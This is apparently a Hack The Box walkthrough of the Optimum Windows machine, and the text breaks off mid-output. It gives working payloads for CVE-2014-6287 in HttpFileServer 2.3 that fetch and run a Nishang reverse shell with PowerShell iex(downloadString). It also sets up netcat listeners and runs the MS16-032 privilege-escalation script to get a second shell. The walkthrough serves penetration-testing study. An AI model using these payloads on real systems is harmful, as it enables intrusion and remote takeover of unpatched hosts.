This is [hackthebox](https://app.hackthebox.com/machines/6) Windows machine with outdated installed software which results to remote code code execution which i will use it to get user account and then kernel unpatched issues which i will use to get system account.

After scanning only port `80` is up and this is web server 

![image](/assets/img/optimum//01.png)

I tested for `sql` injection but no luck, i decided to check for the information site provides and the first thing to check was the message with some sort of the name and version of this web [HttpFileServer 2.3](http://www.rejetto.com/hfs/) 

I searched first for `HFS` to know what it is and how does it work. Then i found out `HFS` is a small HTTP file server, aimed at mostly sharing files for download.

It is different from classic file sharing because is a web server which uses web technology to be more compatible with today's Internet. 

It also  includes its own proprietary scripting language known as `macros`, which can be used to expand functionality of the program. Scripts can be used in a variety of methods including event handlers and directly on web pages. Macros can even be written to bypass the program's account system with a custom one

After this knowledge i did some few findings to check if this version has a know vulnerability and i found the [CVE-2014-6287](https://nvd.nist.gov/vuln/detail/CVE-2014-6287). This vulnerability is caused by `findMacroMarker` function in `parserLib.pas` in `Rejetto` HTTP File Server (aks HFS or HttpFileServer) 2.3x before 2.3c allows remote attackers to execute arbitrary programs via a `%00` sequence in a search action

In searching action where i tested before the `sqli` is the right place where there is a vulnerability which allows code execution. The `CVE` says that the execution is possible via `%00` which is equivalent to `0`  `null byte` then this cause `HFS` versions 2.3, 2.3a, and 2.3b to be vulnerable  due to a regular expression in `parserLib.pas` that fails to handle null bytes.
In search action an attacker can do the following `%00{.exec|malicious_codes}` .
## Shell as kostas.
To exploit this machine i followed [vk9-sec](https://vk9-sec.com/hfs-code-execution-cve-2014-6287/)  blog post which elaborates clearly on how to exploit the `HttpFileServer 2.3` and the followings are the steps:

**Step 01**

Intercept  request with burpsuite  

![image](/assets/img/optimum/02.png) 

**Step 02**

In search action change it malicious payload and to make sure that there is hit then try to ping your own system make sure to listen the response by using `tcpdump` and specify the interface `tun0` 

```
┌──(gemstone㉿hashghost)-[~/C7F5/htb/OSCP/Optimum]
└─$ sudo tcpdump -i tun0 icmp
```

**Result**

![image](/assets/img/optimum/03.png)

**Step 03**

Since i get a ping back then i will download [nishang](https://github.com/samratashok/nishang) and navigate to  `shells` and open  `Invoke-PowerShellTcp.ps1` . In this script change some few things such as follows 
```
Invoke-PowerShellTcp -Reverse -IPAddress fe80::20c:29ff:fe9d:b983 -Port 4444
```
Copy the above command and place at the bottom of the script and then do some changes such as add your `tun0` ip address, port number can remain the same.
```
    catch
    {
        Write-Warning "Something went wrong! Check if the server is reachable and you are using the correct port." 
        Write-Error $_
    }
}
Invoke-PowerShellTcp -Reverse -IPAddress 10.10.14.27 -Port 9005
```
**Step 04**

Start python server to host the script 
```
┌──(gemstone㉿hashghost)-[~/…/Optimum/exploit/nishang/Shells]
└─$ python3 -m http.server 80
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
```
**Step 05**<br>
Start listener for a remote connection. 
```
┌──(gemstone㉿hashghost)-[~/C7F5/htb/OSCP/Optimum]
└─$ nc -nlvp 9005
listening on [any] 9005 ...
```
**Step 06**

Send the payload with burpsuite and wait for the remote connection.
```
/?search=%00{.exec|C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe iex(new-object net.webclient).downloadString('http://10.10.14.27/Invoke-PowerShellTcp.ps1').}
```
It is important to specify the full path so that to tell which version should `powershell` run with.

## Privilege Escalation 
To check for windows vulnerabilities different tools can be used such as `sherlock`, `Windows-Exploit-Suggester` and i will use [Windows-Exploit-Suggester](https://github.com/Pwnistry/Windows-Exploit-Suggester-python3) but to run it two files must be available one is the file with `systeminfo` of the machine you want to attack and another file is the database file, you can update the suggester or you can download it form here [Database](https://github.com/SecWiki/windows-kernel-exploits/blob/master/win-exp-suggester/2017-06-14-mssb.xls).

```
It will indicate some exploits links and also  i need one which will open `poweshell` and not `cmd` also  these exploits wont because of the i get shell as `32` systems then all interpretation is based on that. Now i have to get new shell with `64` .

To know the architecture tun the followings:-
```
PS C:\Users\kostas\Desktop>  [Environment]::Is64BitProcess
False
```
To understand more check [ss64](https://ss64.com/nt/syntax-64bit.html)

To get new shell i should change from
```
/?search=%00{.exec|C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe iex(new-object net.webclient).downloadString('http://10.10.14.27/Invoke-PowerShellTcp.ps1').}
```
To the followings:-
```
/?search=%00{.exec|C:\Windows\SysNative\WindowsPowerShell\v1.0\powershell.exe iex(new-object net.webclient).downloadString('http://10.10.14.27/Invoke-PowerShellTcp.ps1').}
```
I used the same steps a before to get the shell but i only change from `System32` to `SysNative` so now if check for the architecture again.
```
PS C:\Users\kostas\Desktop>[Environment]::Is64BitProcess
True
```
### System user
Here i will use some steps to have the shell as system 

**Step 01**

I will use `Empire`  it is already installed in Kali Linux and i will the `Invoke-MS16032.ps1`
```
┌──(gemstone㉿hashghost)-[~/C7F5/htb/OSCP/Optimum]
└─$ locate Invoke-MS16032
/usr/share/powershell-empire/empire/server/data/module_source/privesc/Invoke-MS16032.ps1
```
Now i will copy it t my home directory and do some alterations 
```
┌──(gemstone㉿hashghost)-[~/C7F5/htb/OSCP/Optimum]
└─$ cp /usr/share/powershell-empire/empire/server/data/module_source/privesc/Invoke-MS16032.ps1 .
```
Now add the following line at the end of the script.
```
Invoke-MS16-032 -Cmd "iex(New-Object Net.WebClient).DownloadString('http://10.10.14.35:8001/Invoke-PowerShellTcp.ps1')"
```

**Step 02**

Since i have to get shell again, then i will use the same `Invoke-PowerSehllTCP` but now i will edit the name to avoid confusion with the initial file and modify the file as before by adding this line at the end of the file.
```
Invoke-PowerShellTcp -Reverse -IPAddress 10.10.14.35 -Port 9006
```
**Step 03**

Transfer file `Invoke-MS16032.ps1` to Windows
```
┌──(gemstone㉿hashghost)-[~/C7F5/htb/OSCP/Optimum]
└─$ python3 -m http.server 80
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...


PS C:\Users\kostas\Desktop> iwr http://10.10.14.35/Invoke-MS16032.ps1 -outf Invoke-MS16032.ps1 
PS C:\Users\kostas\Desktop>
```
**Step 04**

Run the script `Invoke-MS16032.ps1` while listening to `9006`
```
PS C:\Users\kostas\Desktop> .\Invoke-MS16032.ps1
         __ __ ___ ___   ___     ___ ___ ___
        |  V  |  _|_  | |  _|___|   |_  |_  |
